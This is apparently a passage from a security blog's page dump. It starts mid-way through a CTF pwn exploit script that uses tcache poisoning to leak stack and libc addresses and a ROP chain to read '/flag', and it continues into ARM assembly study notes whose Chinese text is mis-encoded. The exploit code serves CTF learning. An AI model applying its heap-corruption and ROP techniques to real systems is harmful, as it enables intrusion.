class="number">8</span>)</span><br><span class="line">edit(<span class="number">8</span>,p64(leak3-<span class="number">8</span>))</span><br><span class="line">add(<span class="number">1000</span>,<span class="string">b&quot;e&quot;</span>*<span class="number">1</span>) <span class="comment">#9</span></span><br><span class="line">add(<span class="number">1000</span>,<span class="string">b&quot;f&quot;</span>*<span class="number">1</span>) <span class="comment">#10</span></span><br><span class="line">add(<span class="number">1000</span>,<span class="string">b&quot;g&quot;</span>*<span class="number">1</span>) <span class="comment">#11</span></span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0x01545)&#x27;)#malloc </span></span><br><span class="line">add(<span class="number">1000</span>,<span class="string">b&quot;h&quot;</span>*<span class="number">8</span>) <span class="comment">#12</span></span><br><span class="line">show(<span class="number">12</span>)</span><br><span class="line">ru(<span class="string">b&#x27;h&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">leak_stack=uu64(r(<span class="number">6</span>))</span><br><span class="line">p(<span class="string">&#x27;leak_stack&#x27;</span>,leak_stack)</span><br><span class="line">__libc_start_main_243_stack=leak_stack-(<span class="number">0x7ffc8d14f0d0</span>-<span class="number">0x7ffc8d14f0a8</span>)</span><br><span class="line">p(<span class="string">&#x27;__libc_start_main_243_stack&#x27;</span>,__libc_start_main_243_stack)</span><br><span class="line"><span class="comment"># 0x1950</span></span><br><span class="line">add(<span class="number">1000</span>,<span class="string">b&quot;z&quot;</span>*<span class="number">1</span>) <span class="comment">#13</span></span><br><span class="line">add(<span class="number">1000</span>,<span class="string">b&quot;x&quot;</span>*<span class="number">1</span>) <span class="comment">#14</span></span><br><span class="line">dele(<span class="number">13</span>)</span><br><span class="line">dele(<span class="number">14</span>)</span><br><span class="line">edit(<span class="number">14</span>,p64(__libc_start_main_243_stack-<span class="number">8</span>))</span><br><span class="line">add(<span class="number">1000</span>,<span class="string">b&quot;e&quot;</span>*<span class="number">1</span>) <span class="comment">#15</span></span><br><span class="line">add(<span class="number">1000</span>,<span class="string">b&quot;f&quot;</span>*<span class="number">1</span>) <span class="comment">#16</span></span><br><span class="line">add(<span class="number">1000</span>,<span class="string">b&quot;g&quot;</span>*<span class="number">1</span>) <span class="comment">#17</span></span><br><span class="line">add(<span class="number">1000</span>,<span class="string">b&quot;i&quot;</span>*<span class="number">8</span>) <span class="comment">#18</span></span><br><span class="line">show(<span class="number">18</span>)</span><br><span class="line">ru(<span class="string">b&#x27;i&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">__libc_start_main=uu64(r(<span class="number">6</span>))-<span class="number">243</span></span><br><span class="line">p(<span class="string">&#x27;__libc_start_main&#x27;</span>,__libc_start_main)</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;__libc_start_main&#x27;</span>,__libc_start_main)</span><br><span class="line">base=__libc_start_main-libc.dump(<span class="string">&#x27;__libc_start_main&#x27;</span>)</span><br><span class="line">p(<span class="string">&#x27;base&#x27;</span>,base)</span><br><span class="line"></span><br><span class="line">systemcall=base+libc_elf.symbols[<span class="string">&#x27;syscall&#x27;</span>]</span><br><span class="line">p(<span class="string">&#x27;systemcall&#x27;</span>,systemcall)</span><br><span class="line">write=base+libc_elf.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read=base+libc_elf.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">pop_rdi=base+<span class="number">0x0000000000023b6a</span></span><br><span class="line">pop_rsi_r15=base+<span class="number">0x0000000000023b68</span></span><br><span class="line">pop_rdx=base+<span class="number">0x0000000000142c92</span></span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0x0017F9)&#x27;) #edit</span></span><br><span class="line">edit_ret=__libc_start_main_243_stack-<span class="number">0x20</span></span><br><span class="line">p(<span class="string">&#x27;edit_ret&#x27;</span>,edit_ret)</span><br><span class="line">bss=__libc_start_main_243_stack+<span class="number">0x100</span></span><br><span class="line">payload=p64(pop_rdi)+p64(<span class="number">2</span>)+p64(pop_rsi_r15)+p64(leak1)+p64(<span class="number">0xdeadbeef</span>)+p64(systemcall)</span><br><span class="line">payload+=p64(pop_rdi)+p64(<span class="number">3</span>)+p64(pop_rsi_r15)</span><br><span class="line">payload+=p64(bss)+p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload+=p64(pop_rdx)+p64(<span class="number">60</span>)+p64(read)</span><br><span class="line">payload+=p64(pop_rdi)+p64(<span class="number">1</span>)+p64(pop_rsi_r15)+p64(bss)+p64(<span class="number">0xdeadbeef</span>)+p64(pop_rdx)+p64(<span class="number">60</span>)+p64(write)</span><br><span class="line"></span><br><span class="line">add(<span class="number">700</span>,<span class="string">b&quot;z&quot;</span>*<span class="number">1</span>) <span class="comment">#19</span></span><br><span class="line">add(<span class="number">700</span>,<span class="string">b&quot;x&quot;</span>*<span class="number">1</span>) <span class="comment">#20</span></span><br><span class="line">dele(<span class="number">19</span>)</span><br><span class="line">dele(<span class="number">20</span>)</span><br><span class="line">edit(<span class="number">20</span>,p64(edit_ret-<span class="number">8</span>))</span><br><span class="line">add(<span class="number">700</span>,<span class="string">b&quot;e&quot;</span>*<span class="number">1</span>) <span class="comment">#21</span></span><br><span class="line">add(<span class="number">700</span>,<span class="string">b&quot;f&quot;</span>*<span class="number">1</span>) <span class="comment">#22</span></span><br><span class="line">add(<span class="number">700</span>,<span class="string">b&quot;g&quot;</span>*<span class="number">1</span>) <span class="comment">#23</span></span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0x0017F9)&#x27;) #edit</span></span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0x01545)&#x27;)#malloc </span></span><br><span class="line">add(<span class="number">700</span>,<span class="string">b&#x27;a&#x27;</span>) <span class="comment">#24</span></span><br><span class="line">add(<span class="number">700</span>,<span class="string">b&#x27;a&#x27;</span>) <span class="comment">#25</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">6</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+<span class="string">b&#x27;/flag\x00&#x27;</span>)</span><br><span class="line">edit(<span class="number">25</span>,p64(__libc_start_main_243_stack-<span class="number">8</span>)+payload)</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">io.interactive()</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">grxer@Ubantu20 ~/D/s/2/mi&gt; ROPgadget  --binary ./libc.so.6 --only &#x27;pop|ret&#x27; | grep rdx</span></span><br><span class="line"><span class="string">0x000000000015f8c5 : pop rax ; pop rdx ; pop rbx ; ret</span></span><br><span class="line"><span class="string">0x0000000000119211 : pop rdx ; pop r12 ; ret</span></span><br><span class="line"><span class="string">0x000000000015f8c6 : pop rdx ; pop rbx ; ret</span></span><br><span class="line"><span class="string">0x000000000010257d : pop rdx ; pop rcx ; pop rbx ; ret</span></span><br><span class="line"><span class="string">0x0000000000142c92 : pop rdx ; ret</span></span><br><span class="line"><span class="string">0x00000000000dfc12 : pop rdx ; ret 0x10</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ARM ASM</title>
      <link href="/2023/07/14/arm-asm/"/>
      <url>/2023/07/14/arm-asm/</url>
      
        <content type="html"><![CDATA[<h1 id="ARM-ASM"><a href="#ARM-ASM" class="headerlink" title="ARM ASM"></a>ARM ASM</h1><p>æ‰‹å†Œ  <a href="https://developer.arm.com/documentation/ddi0487/fc/">https://developer.arm.com/documentation/ddi0487/fc/</a></p><h2 id="å¯„å­˜å™¨"><a href="#å¯„å­˜å™¨" class="headerlink" title="å¯„å­˜å™¨"></a>å¯„å­˜å™¨</h2><table><thead><tr><th>Reg</th><th>APCS</th><th>mean</th></tr></thead><tbody><tr><td>R0</td><td>A1</td><td>å·¥ä½œå¯„å­˜å™¨</td></tr><tr><td>R1</td><td>A2</td><td></td></tr><tr><td>R2</td><td>A3</td><td></td></tr><tr><td>R3</td><td>A4</td><td></td></tr><tr><td>R4</td><td>V1</td><td>å˜é‡å¯„å­˜å™¨(æ˜“å˜å¯„å­˜å™¨)</td></tr><tr><td>R5</td><td>V2</td><td></td></tr><tr><td>R6</td><td>V3</td><td></td></tr><tr><td>R7</td><td>V4</td><td>å¸¸ç”¨æ¥å­˜æ”¾ç³»ç»Ÿè°ƒç”¨å·</td></tr><tr><td>R8</td><td>V5</td><td></td></tr><tr><td>R9</td><td>V6&#x2F;SB</td><td>é™æ€åŸºå€å¯„å­˜å™¨</td></tr><tr><td>R10</td><td>V7&#x2F;SL</td><td>å †æ ˆé™åˆ¶å¯„å­˜å™¨</td></tr><tr><td><strong>R11</strong></td><td>V8&#x2F;<strong>FP</strong></td><td>å¸§æŒ‡é’ˆï¼Œä¿å­˜æ ˆå¸§ï¼Œç›¸å½“äºx86 ebp</td></tr><tr><td>R12</td><td>IP</td><td>æŒ‡ä»¤æŒ‡é’ˆ(ä¸´æ—¶å­˜æ”¾sp)</td></tr><tr><td><strong>R13</strong></td><td><strong>SP</strong></td><td>æ ˆé¡¶æŒ‡é’ˆï¼Œç›¸å½“äºx86 esp</td></tr><tr><td><strong>R14</strong></td><td><strong>LR</strong></td><td>Link Registeré“¾æ¥å¯„å­˜å™¨ï¼Œä¿å­˜å‡½æ•°è¿”å›åœ°å€</td></tr><tr><td><strong>R15</strong></td><td><strong>PC</strong></td><td>ç¨‹åºè®¡æ•°å™¨</td></tr><tr><td>CPSR</td><td></td><td>Current Program Status Register ç¨‹åºçŠ¶æ€å¯„å­˜å™¨</td></tr><tr><td>SPSR</td><td></td><td>Saved Program Status Register ä¸­æ–­æˆ–å¼‚å¸¸æ—¶ä¿å­˜CPSR</td></tr></tbody></table><blockquote><p>APCS ï¼šARM Procedure Call Standard</p></blockquote><ul><li><code>R0 ~ R3</code>æ˜¯ç”¨æ¥ä¾æ¬¡ä¼ é€’å‚æ•°çš„</li><li><code>R0</code>è¿˜è¢«ç”¨äºå­˜å‚¨å‡½æ•°çš„è¿”å›å€¼</li><li><code>R7</code>å¸¸ç”¨æ¥å­˜æ”¾ç³»ç»Ÿè°ƒç”¨å·</li><li><code>R11</code>æ˜¯æ ˆå¸§ï¼Œç›¸å½“äºx86çš„<code>ebp</code>ï¼Œ<code>arm</code>ä¸­å«ä½œ<code>FP</code></li><li><code>R13</code>æ˜¯æ ˆé¡¶ï¼Œç›¸å½“äºx86çš„<code>esp</code>ï¼Œ<code>arm</code>ä¸­å«ä½œ<code>SP</code></li><li><code>R14(LP)</code>ç”¨æ¥å­˜æ”¾å‡½æ•°çš„è¿”å›åœ°å€çš„</li></ul><p>å…³äºpcå¯„å­˜å™¨æ˜¯å¯ä»¥ç›´æ¥èµ‹å€¼çš„å¦‚mov pcï¼Œr0</p><p>å¦‚æœæ˜¯armçŠ¶æ€ï¼Œè¯»pcæ˜¯ä¼šè¯»å–åˆ°å½“å‰æŒ‡ä»¤å¾€åä¸¤æ¡æŒ‡ä»¤çš„ä½ç½®ï¼Œå¦‚ldr r0,[pc],ä»¥mov r0,pcä¸ºä¾‹ï¼Œä¸€æ¡æŒ‡ä»¤å››ä¸ªå­—èŠ‚çš„è¯ r0&#x3D;pc+8</p><p>thumbçŠ¶æ€ä¸‹å°±æ˜¯+4ï¼ŒthumbçŠ¶æ€ä¸‹ï¼ŒæŒ‡ä»¤æ˜¯å˜é•¿çš„ï¼Œå³ä½¿å½“å‰æŒ‡ä»¤ä¸‹é¢ä¸¤æ¡æŒ‡ä»¤æ˜¯ä¸€ä¸ªå››å­—èŠ‚ä¸€ä¸ªäºŒå­—èŠ‚ï¼Œ<strong>ä¾æ—§æ˜¯è¯»å‡ºæ¥ä¾æ—§æ˜¯+4</strong></p><p>ldr r0,[pc] å¦‚æœpc+4ä¸ä¸ºå››å­—èŠ‚å¯¹é½çš„è¯ï¼Œä¼šå‘ä¸‹å–æ•´åˆ°å››å­—èŠ‚å¯¹é½åå†è¯»å–</p><p><img src="/2023/07/14/arm-asm/image-20230718115628492.png" alt="image-20230718115628492"></p><h2 id="æŒ‡ä»¤"><a href="#æŒ‡ä»¤" class="headerlink" title="æŒ‡ä»¤"></a>æŒ‡ä»¤</h2><ul><li>å†…å­˜æ“ä½œæ•°å’Œç«‹å³æ•°æ“ä½œæ•°ä¸èƒ½åŒæ—¶å‡ºç°</li><li>å†…å­˜æ“ä½œæ•°è‡³å¤šå‡ºç°ä¸€æ¬¡</li><li>å¯„å­˜å™¨æ“ä½œæ•°æ€»æ˜¯åœ¨æœ€å‰é¢</li></ul><p>&lt;opcode&gt; {&lt;cond&gt;} {S} &lt;Rd&gt; , &lt;Rn&gt; { , <shift_op2> }</shift_op2></p><ul><li>opcode:æŒ‡ä»¤  </li><li>condï¼šæ¡ä»¶ç  </li><li>Sï¼šå¯é€‰åç¼€,åŠ ä¸Šâ€œSâ€ï¼Œåœ¨æŒ‡ä»¤æ‰§è¡Œå®Œæ¯•åè‡ªåŠ¨æ›´æ–°CPSRä¸­çš„æ¡ä»¶ç æ ‡å¿—ä½çš„å€¼</li><li>Rdï¼šç›®æ ‡å¯„å­˜å™¨</li><li>Rnï¼šç¬¬ä¸€ä¸ªæ“ä½œæ•°</li><li>op2ï¼šç¬¬äºŒä¸ªæ“ä½œæ•°</li></ul><h3 id="æ¡ä»¶åç¼€"><a href="#æ¡ä»¶åç¼€" class="headerlink" title="æ¡ä»¶åç¼€"></a>æ¡ä»¶åç¼€</h3><p><img src="/2023/07/14/arm-asm/image-20230714202416326.png" alt="image-20230714202416326"></p><p><img src="/2023/07/14/arm-asm/image-20230714211613500.png" alt="image-20230714211613500"></p><h3 id="mov"><a href="#mov" class="headerlink" title="mov"></a>mov</h3><p>armé‡Œ<code>mov</code>æŒ‡ä»¤ï¼Œé€šå¸¸ç”¨äºå¯„å­˜å™¨ä¸å¯„å­˜å™¨é—´çš„æ•°æ®ä¼ è¾“ï¼Œä¹Ÿå¯ä»¥ä¼ é€’ç«‹å³æ•°</p><p>movå®šé•¿æŒ‡ä»¤çš„è¯å°±ä¸èƒ½æ“ä½œä¸€äº›ç‰¹åˆ«å¤§çš„ç«‹å³æ•°</p><p>mov r0,0x4567 å†™r0ä½16ä½(ä¼šå¯¹r0é«˜16ä½åš0æ‹“å±•)</p><p>movt r0,0x1234 å†™r0é«˜16ä½</p><p><code>mov r1, #0x10ï¼šr1 = 0x10</code></p><p><code>mov r1, r2ï¼šr1 = r2</code></p><p><code>mov r1, r2, LSL#2ï¼šr1 = r2 &lt;&lt; 2</code> </p><h3 id="åŸºæœ¬è¿ç®—"><a href="#åŸºæœ¬è¿ç®—" class="headerlink" title="åŸºæœ¬è¿ç®—"></a>åŸºæœ¬è¿ç®—</h3><p><strong>add adds cmn</strong> æœ‰sçš„æ—¢è¦ç»“æœåˆè®¾ç½®çŠ¶æ€å¯„å­˜å™¨çš„æ ‡å¿—ä½ï¼Œä¸å¸¦sçš„åªè¦è¿ç®—ç»“æœ</p><p><code>add r1, r2, #2</code> : <code>r1 = r2 + 2</code>ï¼›</p><p><code>add r1,r2,r3</code> : <code>r1=r2+r3</code></p><p><code>add r1, r2, LSL#2</code> : <code>r1 = r2 &lt;&lt; 2</code></p><p><strong>sub subs cmp</strong> </p><p><code>sub r1, r2, r3</code> : <code>r1 = r2 - r3</code></p><p><strong>rsb</strong></p><p><code>rsb r0,r1,#8</code> : <code>r0=8-r1</code></p><p><strong>and</strong></p><p>ä¸ï¼Œåªå½±å“æ ‡å¿—ä½çš„ä¸æŒ‡ä»¤<strong>tst</strong></p><p><code>and and r0,r1,r2</code> : <code>r0 = r1&amp;r2</code></p><p><strong>bic</strong></p><p><code>bic r0,r1,r2</code> :<code>r0=(~r1)&amp;(~r2)</code></p><p><strong>oor</strong> æˆ–</p><p><strong>eor</strong> </p><p>å¼‚æˆ–ï¼Œåªå½±å“æ ‡å¿—ä½çš„å¼‚æˆ–æŒ‡ä»¤<strong>teq</strong></p><p>å®ç°notå–åæŒ‡ä»¤æ˜¯é€šè¿‡ä¸ä¸€ä¸ªå…¨1çš„æ•°è¿›è¡Œå¼‚æˆ–</p><p><strong>lsl</strong>(logic shift left)</p><p>é€»è¾‘å·¦ç§»</p><p><strong>lsr</strong>(logic shift right)</p><p>é€»è¾‘å³ç§»</p><p><strong>asr</strong>(arithmatic shift right)</p><p>ç®—æ•°å³ç§»ï¼Œå·¦ç«¯ç”¨ç¬¬31ä½çš„å€¼æ¥å¡«å……</p><p><strong>ROR</strong></p><p>å¾ªç¯å³ç§»</p><p><strong>mvn</strong>(Move Not)</p><p><code>MVN r1,r2</code> : <code>r1=~r2</code></p><h3 id="è®¿å­˜æŒ‡ä»¤"><a href="#è®¿å­˜æŒ‡ä»¤" class="headerlink" title="è®¿å­˜æŒ‡ä»¤"></a>è®¿å­˜æŒ‡ä»¤</h3><p><strong>LDR</strong></p><p><code>LDR &#123;cond&#125; Rd, &lt;addr&gt;</code>ï¼šåŠ è½½æŒ‡å®šåœ°å€(<code>addr</code>)ä¸Šçš„æ•°æ®(å­—)ï¼Œæ”¾å…¥åˆ°<code>Rd</code>å¯„å­˜å™¨ä¸­ã€‚</p><p><strong>STR</strong></p><p><code>STR &#123;cond&#125; Rd, &lt;addr&gt;</code>ï¼šå°†<code>Rd</code>å¯„å­˜å™¨ä¸­çš„æ•°æ®(å­—)å­˜å‚¨åˆ°æŒ‡å®šåœ°å€(<code>addr</code>)ä¸­ã€‚</p><p><strong>ADR</strong></p><p>ADR register,exper ä¸€æ¡å°èŒƒå›´çš„åœ°å€è¯»å–<strong>ä¼ªæŒ‡ä»¤</strong>,å®ƒå°†åŸºäºPCçš„ç›¸å¯¹åç§»çš„åœ°å€å€¼è¯»åˆ°ç›®æ ‡å¯„å­˜å™¨ä¸­</p><p>æ±‡ç¼–å™¨é¦–å…ˆè®¡ç®—å½“å‰PCå€¼ï¼ˆå½“å‰æŒ‡ä»¤ä½ç½®ï¼‰åˆ°experçš„è·ç¦»,ç„¶åç”¨ä¸€æ¡ADDæˆ–è€…SUBæŒ‡ä»¤æ›¿æ¢è¿™æ¡ä¼ªæŒ‡ä»¤ï¼Œ</p><p>è¿™ä¸ªadråœ¨idaå¸®æˆ‘ä»¬è§£æå¥½äº†ç”ŸæˆåŸæœ¬çš„adrä¼ªæŒ‡ä»¤ï¼Œå®é™…æ±‡ç¼–é‡Œæ˜¯add </p><p>idaé‡Œ</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.plt:<span class="number">00010304</span> <span class="number">00</span> C6 <span class="number">8F</span> E2                   ADR     R12, <span class="number">0x1030C</span></span><br><span class="line">.plt:<span class="number">00010308</span> <span class="number">10</span> CA <span class="number">8</span>C E2                   ADD     R12, R12, #<span class="number">0x10000</span></span><br><span class="line">.plt:<span class="number">0001030</span>C <span class="number">04</span> FD BC E5                   LDR     PC, [R12,#(printf_ptr - <span class="number">0x2030C</span>)]! ; __imp_printf</span><br></pre></td></tr></table></figure><p>objdumpé‡Œ</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">00010304</span> &lt;<span class="built_in">printf</span>@plt&gt;:                                                                                                                                                                                             </span><br><span class="line"><span class="number">10304</span>:       e28fc600        add     ip, pc, #<span class="number">0</span>, <span class="number">12</span>                                                                                                                                                             </span><br><span class="line"><span class="number">10308</span>:       e28cca10        add     ip, ip, #<span class="number">16</span>, <span class="number">20</span> ; <span class="number">0x10000</span>                                                                                                                                                  </span><br><span class="line"><span class="number">1030</span>c:       e5bcfd04        ldr     pc, [ip, #<span class="number">3332</span>]!        ; <span class="number">0xd04</span> </span><br></pre></td></tr></table></figure><p>10304è¿™é‡Œçš„addæŒ‡ä»¤äº›è®¸å¥‡æ€ªï¼Œæœ€å³è¾¹çš„12çš„æ„æ€æ˜¯æŠŠ0å‘å³åš20ä½å¾ªç¯ç§»ä½</p><p>10308ä¹Ÿæ˜¯æŠŠ16å‘å³åš20ä½å¾ªç¯ç§»ä½</p><p>1030cæœ€åè¿˜æ˜¯ä»gotè¡¨é‡Œæ‹¿äº†printfåœ°å€</p><p><a href="https://reverseengineering.stackexchange.com/questions/16154/arm-add-instruction-with-shift#:~:text=Unlike%20a%20logical%20shift%2C%20the%20vacant%20bit%20positions,%2B%20%280%20%3C%3C%2012%29%20%3D%20PC%20%2B%200">https://reverseengineering.stackexchange.com/questions/16154/arm-add-instruction-with-shift#:~:text=Unlike%20a%20logical%20shift%2C%20the%20vacant%20bit%20positions,%2B%20%280%20%3C%3C%2012%29%20%3D%20PC%20%2B%200</a></p><p><a href="https://stackoverflow.com/questions/16207865/weird-gas-arm-syntax">https://stackoverflow.com/questions/16207865/weird-gas-arm-syntax</a></p><blockquote><p>è®°å¿†æŠ€å·§ï¼šæ•°æ®åœ¨å¯„å­˜å™¨é‡Œå¤„ç†ä¸”å¯„å­˜å™¨cpuå¯ä»¥ç›´æ¥è®¿é—®ï¼Œæ‰€ä»¥loadè‚¯å®šæ—¶ä»å†…å­˜åŠ è½½åˆ°å¯„å­˜å™¨ï¼Œstoreæ—¶ä»å¯„å­˜å™¨å­˜åˆ°å†…å­˜</p></blockquote><p><code>str r2, [r1, #2]</code>ï¼šå¯„å­˜å™¨<code>r2</code>ä¸­çš„å€¼è¢«å­˜æ”¾åˆ°å¯„å­˜å™¨<code>r1</code>ä¸­çš„åœ°å€åŠ <code>2</code>å¤„çš„åœ°å€ä¸­ï¼Œ<code>r1</code>å¯„å­˜å™¨ä¸­çš„å€¼ä¸å˜;</p><p><code>str r2, [r1, #2]!</code>ï¼šä¸ä¸Šä¸€æ¡ä¸€æ ·ï¼Œä¸è¿‡æœ€å<code>r1 += 2</code>ï¼Œè¿™é‡Œçš„<code>&#123;!&#125;</code>æ˜¯å¯é€‰åç¼€ï¼Œè‹¥é€‰ç”¨è¯¥åç¼€ï¼Œåˆ™è¡¨ç¤ºè¯·æ±‚å›å†™ï¼Œä¹Ÿå°±æ˜¯å½“æ•°æ®ä¼ é€å®Œæ¯•ä¹‹åï¼Œå°†æœ€åçš„åœ°å€å†™å…¥åˆ°åŸºå€å¯„å­˜å™¨r1(<code>Rn</code>)ä¸­;</p><p><code>ldr r2, [r1], #-2</code>ï¼šå°†<code>r1</code>å¯„å­˜å™¨é‡Œåœ°å€ä¸­çš„å€¼ç»™<code>r2</code>å¯„å­˜å™¨ï¼Œæœ€å<code>r1 -= 2</code>ï¼›</p><p><code>str r2, [r1, r3, LSL#2]</code>ï¼šå°†å¯„å­˜å™¨<code>r2</code>ä¸­çš„å€¼å­˜å‚¨åˆ°å¯„å­˜å™¨<code>r1</code>ä¸­çš„åœ°å€åŠ ä¸Š<code>r3</code>å¯„å­˜å™¨ä¸­çš„å€¼å·¦ç§»ä¸¤ä½åçš„å€¼æ‰€æŒ‡å‘çš„åœ°å€ä¸­ï¼›</p><p><code>ldr r2, [r1], r3, LSL#2</code>ï¼šå°†<code>r1</code>å¯„å­˜å™¨é‡Œåœ°å€ä¸­çš„å€¼ç»™<code>r2</code>å¯„å­˜å™¨ï¼Œæœ€å<code>r1 += r3 &lt;&lt; 2</code>.</p><p><code>str r0,[sp,#-4]!</code>: ç›¸å½“äºpush r0</p><p><code>ldr r0,[sp],#4</code>:ç›¸å½“äºpop r0</p><h3 id="å—è®¿å­˜"><a href="#å—è®¿å­˜" class="headerlink" title="å—è®¿å­˜"></a>å—è®¿å­˜</h3><p><a href="https://blog.csdn.net/stephenbruce/article/details/51151147">https://blog.csdn.net/stephenbruce/article/details/51151147</a></p><p><strong>ldm</strong> ä¾æ—§æ˜¯ä»å†…å­˜loadåˆ°å¯„å­˜å™¨</p><p><strong>stm</strong>ä»å¯„å­˜å™¨storeåˆ°å†…å­˜</p><p>ç”¨äºå†…å­˜æè¿°</p><p> IA  â€”-&gt;  Increment  After  æ¯æ¬¡ä¼ é€<em><strong>å</strong></em>åœ°å€<em><strong>åŠ 4</strong></em><br> IB  â€”-&gt;  Increment  Before  æ¯æ¬¡ä¼ é€<em><strong>å‰</strong></em>åœ°å€<em><strong>åŠ 4</strong></em><br> DA  â€”-&gt;  Decrement  After  æ¯æ¬¡ä¼ é€<em><strong>å</strong></em>åœ°å€<em><strong>å‡4</strong></em><br> DB  â€”-&gt;  Decrement  Before  æ¯æ¬¡ä¼ é€<em><strong>å‰</strong></em>åœ°å€<em><strong>å‡4</strong></em></p><p>ç”¨äºå †æ ˆæè¿° <strong>å¦‚æœé€’å¢ï¼ŒSTMå°†å‘ä¸Šï¼ŒLDMå‘ä¸‹</strong></p><p> FA  â€”-&gt;  Full  Ascending    æ»¡é€’å¢å †æ ˆ  è¿™é‡Œfullçš„æ„æ€å°±æ˜¯spæŒ‡å‘çš„æ ˆåœ°å€é‡Œçš„æ•°æ®æ˜¯æœ‰ç”¨æ•°æ®<br> FD  â€”-&gt;  Full  Descending   æ»¡é€’å‡å †æ ˆ<br> EA  â€”-&gt;  Empty  Ascending    ç©ºé€’å¢å †æ ˆ  è¿™é‡ŒEmpty çš„æ„æ€å°±æ˜¯spæŒ‡å‘çš„æ ˆåœ°å€é‡Œçš„æ˜¯åƒåœ¾æ•°æ®çš„ sp+4æ‰æ˜¯æœ‰ç”¨çš„<br> ED  â€”-&gt;  Empty  Descending  ç©ºé€’å‡å †æ ˆ</p><p>æ‰€ä»¥ldmfd&#x3D;ldmiaï¼Œstmfd&#x3D;stmdb</p><p><strong>STMFD   SP!, {R4-R11,LR} ç›¸å½“äºpush R4-R11 push LR</strong></p><p><strong>æœ‰ï¼çš„è¯æŒ‡ä»¤æ‰§è¡Œå®ŒSPå€¼ä¼šå˜ï¼Œå¦åˆ™ä¸å˜</strong></p><p><strong>LDMFD   SP!, {R4-R11,LR} å°±æ˜¯popå‡ºæ ˆ</strong></p><h3 id="åˆ†æ”¯è·³è½¬"><a href="#åˆ†æ”¯è·³è½¬" class="headerlink" title="åˆ†æ”¯è·³è½¬"></a>åˆ†æ”¯è·³è½¬</h3><p>B imm ç›¸å½“äºx86 jmp</p><p>BL imm è·³è¿‡å» ä¸”æŠŠæŒ‡ä»¤çš„ä¸‹ä¸€æ¡åœ°å€å’Œcpsrå¯„å­˜å™¨çš„tä½(tä¸º1è¡¨ç¤ºthumbæ¨¡å¼)æˆ–è¿ç®—åå†™å…¥lrå¯„å­˜å™¨ï¼Œ</p><p>BLX imm blx+ç«‹å³æ•°çš„è¯ä¸€å®šæœ‰æ¨¡å¼åˆ‡æ¢ call</p><p>BX reg  <strong>æŠŠregæœ€ä½ä¸€ä¸ªbitå†™å…¥cpsrçš„tä½</strong>ï¼Œç„¶åæŠŠregæœ€ä½ä¸€bitç½®0ï¼Œjmpåˆ°reg </p><p>BLX reg æ¯”bx+å¯„å­˜å™¨è¡Œä¸ºå¤šäº†ä¸€ä¸ªæŠŠæŒ‡ä»¤çš„ä¸‹ä¸€æ¡åœ°å€å’Œcpsrå¯„å­˜å™¨çš„tä½(tä¸º1è¡¨ç¤ºthumbæ¨¡å¼)æˆ–è¿ç®—åå†™å…¥lrå¯„å­˜å™¨ï¼Œä¸ä¸€å®šæœ‰æ¨¡å¼åˆ‡æ¢</p><p>mov pcï¼Œregæ˜¯ä¸ä¼šæ¨¡å¼åˆ‡æ¢çš„</p><p>BEQ #ä¸ç­‰äº æƒ³åˆ°äº jne<br>BCC #è¿›ä½æ¸…é™¤ï¼Œåº”è¯¥å°±æ˜¯ cmpåï¼Œè¿›ä½ä¸º0å°±è·³ æ„Ÿè§‰å°±åƒæ˜¯ &lt;<br>BGT # å¤§äº<br>BLT #å°äº<br>BCS #è¿›ä½è®¾ç½®ï¼Œåº”è¯¥å°±æ˜¯cmpåï¼Œæœ‰è¿›ä½ æ„Ÿè§‰å°±åƒæ˜¯ &gt;&#x3D;</p><h3 id="è°ƒç”¨çº¦å®šå’Œæ ˆå¸§"><a href="#è°ƒç”¨çº¦å®šå’Œæ ˆå¸§" class="headerlink" title="è°ƒç”¨çº¦å®šå’Œæ ˆå¸§"></a>è°ƒç”¨çº¦å®šå’Œæ ˆå¸§</h3><p>å‰å››ä¸ªå‚æ•°r0-r3ï¼Œå¤šä½™å‚æ•°ä»å³å‘å·¦å‹æ ˆ</p><p>éæ˜“å˜å¯„å­˜å™¨ r4-r11</p><p>r12å¯¼å…¥è¡¨å¯»å€</p><p>å®é™…çœ‹ä¸‹æ¥æ ˆå¸§å’Œx86å·®ä¸å¤šï¼Œåªæ˜¯æœ‰çš„ç»è¿‡äº†ä¸€å±‚å¯„å­˜å™¨ï¼Œè€Œä¸”å› ä¸ºå®šé•¿æŒ‡ä»¤çš„å…³ç³»å¯¼è‡´å¯ä»¥æ“ä½œçš„ç«‹å³æ•°å¤§å°æœ‰é™(æœ‰äº›æƒ…å†µå¯ä»¥åˆ©ç”¨å¾ªç¯ç§»ä½æ¥æ“ä½œè¾ƒå¤§çš„ç«‹å³æ•°)ï¼Œæ‰€ä»¥ç¨‹åºç»å¸¸å¯ä»¥çœ‹åˆ°åˆ©ç”¨pcå¯„å­˜å™¨å’Œä»£ç æ®µä¸‹é¢å­˜æ”¾ä¸€äº›æ•°æ®æ¥èµ‹å€¼</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">int</span> x=<span class="number">0x12345678</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;hello,world&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%x&quot;</span>,x);</span><br><span class="line">  <span class="keyword">return</span> <span 